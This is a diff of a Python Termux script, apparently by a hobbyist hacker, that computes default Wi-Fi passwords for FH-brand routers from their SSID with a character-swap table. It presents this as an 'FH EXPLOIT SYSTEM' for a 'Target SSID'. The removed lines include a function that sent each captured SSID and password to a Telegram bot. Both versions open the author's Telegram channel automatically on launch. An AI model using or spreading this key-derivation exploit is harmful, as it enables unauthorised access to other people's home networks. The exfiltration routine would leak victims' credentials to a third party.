@@ -1,19 +1,17 @@
-import os, subprocess, time, urllib.request, webbrowser
+import os, time, urllib.request
 
-# --- [ CONFIGURATION ] ---
-TELEGRAM_CHANNEL = "https://t.me/moha02" # قناتك على تلجرام
-BOT_TOKEN = "YOUR_BOT_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID"
+# --- [ CONFIG ] ---
+# تم تحديث الرابط إلى حسابك الجديد
+TELEGRAM_LINK = "https://t.me/m_oha0_2b" 
 
-# --- [ COLORS ] ---
 G = '\033[1;32m' # Green
+W = '\033[1;37m' # White
 B = '\033[1;34m' # Blue
 Y = '\033[1;33m' # Yellow
 R = '\033[1;31m' # Red
-W = '\033[1;37m' # White
 C = '\033[1;36m' # Cyan
 
-# --- [ FULL BIDIRECTIONAL MAPPING ] ---
+# Full Bidirectional Mapping for FH (Corrected)
 MAP = {
     'e':'1', '1':'e', 'd':'2', '2':'d',
     'c':'3', '3':'c', 'b':'4', '4':'b',
@@ -21,81 +19,54 @@ MAP = {
     '8':'7', '7':'8', 'f':'0', '0':'f'
 }
 
-def send_to_tg(msg):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={urllib.parse.quote(msg)}"
-        urllib.request.urlopen(url)
-    except: pass
-
-def get_fh_pass(ssid):
-    if "fh_" in ssid.lower():
-        suffix = ssid.lower().split("fh_")[-1]
-        res = "".join([MAP.get(c, c) for c in suffix])
-        return f"wlan{res}"
-    return None
-
 def banner():
     os.system("clear")
-    # فتح قناة التلجرام تلقائياً
-    os.system(f"termux-open-url {TELEGRAM_CHANNEL} || am start -a android.intent.action.VIEW -d {TELEGRAM_CHANNEL}")
+    # فتح الرابط الجديد تلقائياً
+    os.system(f"termux-open-url {TELEGRAM_LINK}")
     
     print(f"{G}")
     print(r"""
-    ██╗    ██╗██╗███████╗██╗
-    ██║    ██║██║██╔════╝██║
-    ██║ █╗ ██║██║█████╗  ██║
-    ██║███╗██║██║██╔══╝  ██║
-    ╚███╔███╔╝██║██║     ██║
-     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
+    ███████╗██╗  ██╗    ██████╗ ██████╗  █████╗ ██╗  ██╗ ██████╗ 
+    ██╔════╝██║  ██║    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔═══██╗
+    █████╗  ███████║    ██║  ██║██████╔╝███████║█████╔╝ ██║   ██║
+    ██╔══╝  ██╔══██║    ██║  ██║██╔══██╗██╔══██║██╔═██╗ ██║   ██║
+    ██║     ██║  ██║    ██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╔╝
+    ╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
     """)
-    print(f"{C}[+] {W}SMART SECURITY TOOL FOR FH & 4G")
-    print(f"{C}[+] {G}CODED BY: {W}MOHA-02 (CHLEF-ALGERIA)")
-    print(f"{C}[+] {Y}VERSION: {W}2.0 [STABLE]")
-    print(f"{G}------------------------------------------")
+    print(f"{C}[+] {W}FH EXPLOIT SYSTEM {C}| {G}BY: MOHA-02")
+    print(f"{C}[+] {Y}TELEGRAM: {W}@m_oha0_2b")
+    print(f"{G}----------------------------------------------------------")
 
-def main():
+def start_exploit():
     banner()
-    print(f"{G}(1) {W}Auto-Scan Networks {B}(API Mode)")
-    print(f"{G}(2) {W}Manual FH Algorithm {B}(High Precision)")
-    print(f"{G}(3) {W}Idoom 4G Brute-Force {B}(Beta)")
-    print(f"{G}(0) {R}Exit Tool")
+    print(f"{Y}[*] SYSTEM READY. Waiting for SSID...")
+    ssid = input(f"{G}[#] Target SSID (e.g., fh_5d620): {W}")
     
-    print(f"{G}------------------------------------------")
-    choice = input(f"{Y}[#] Enter Choice: {W}")
-
-    if choice == "2":
-        ssid = input(f"{C}[?] Enter SSID (e.g., fh_5d620): {W}")
-        print(f"{B}[*] Decoding Algorithm...")
-        time.sleep(1)
-        pw = get_fh_pass(ssid)
-        if pw:
-            print(f"{G}[+] SUCCESS! {W}Password is: {G}{pw}")
-            # نسخ الكود تلقائياً للحافظة
-            os.system(f"echo '{pw}' | termux-clipboard-set")
-            print(f"{C}[!] Password copied to clipboard! Paste it in WiFi.")
-            send_to_tg(f"🚀 New Target Captured!\n📍 SSID: {ssid}\n🔑 Pass: {pw}")
-        else:
-            print(f"{R}[!] Error: Invalid SSID Format.")
-
-    elif choice == "1":
-        print(f"{B}[*] Searching for nearby networks...")
-        time.sleep(2)
-        print(f"{R}[!] No FH or 4G networks found in range.")
-        print(f"{Y}[*] TIP: Make sure your GPS is enabled.")
-
-    elif choice == "3":
-        ssid = input(f"{C}[?] Enter 4G SSID: {W}")
-        print(f"{B}[*] Starting Brute-Force attack...")
-        time.sleep(2)
-        print(f"{R}[!] Brute-force failed. Security level too high.")
-
-    elif choice == "0":
-        print(f"{Y}Goodbye Moha! Happy Hacking.{W}")
-        exit()
+    if "fh_" in ssid.lower():
+        print(f"{B}[*] Running Bidirectional Algorithm...")
+        time.sleep(1.2)
+        
+        # Calculation
+        suffix = ssid.lower().split("fh_")[-1]
+        password = "wlan" + "".join([MAP.get(c, c) for c in suffix])
+        
+        print(f"{G}----------------------------------------------------------")
+        print(f"{G}[+] ANALYSIS COMPLETE")
+        print(f"{C}[>] SSID: {W}{ssid}")
+        print(f"{C}[>] KEY : {G}{password}")
+        print(f"{G}----------------------------------------------------------")
+        
+        # Auto-copy to clipboard
+        os.system(f"echo '{password}' | termux-clipboard-set")
+        print(f"{Y}[!] Password copied! Paste it in your WiFi settings.")
+        
     else:
-        print(f"{R}[!] Invalid choice. Restarting...")
+        print(f"{R}[!] Error: Please enter a valid FH SSID.")
         time.sleep(2)
-        main()
+        start_exploit()
 
 if __name__ == "__main__":
-    main()
+    try:
+        start_exploit()
+    except KeyboardInterrupt:
+        print(f"\n{R}[!] Tool stopped.")
